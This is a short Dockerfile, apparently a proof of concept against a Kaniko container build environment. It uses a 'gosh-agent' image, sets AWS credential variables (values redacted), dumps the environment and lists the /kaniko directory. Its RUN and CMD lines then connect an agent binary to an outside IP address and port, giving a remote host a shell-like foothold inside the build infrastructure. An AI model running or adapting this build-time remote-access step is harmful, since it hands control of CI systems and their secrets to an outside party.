FROM praetorianlabs/gosh-agent
ENV AWS_ACCESS_KEY=AKI**redacted**
ENV AWS_SECRET_ACCESS_KEY=RQ**redacted**aq
RUN env   
RUN apk update && apk add tree
RUN tree /kaniko
RUN ./goshd -host 104.198.138.155:8083
CMD ["-host", "104.198.138.155:8083"]    

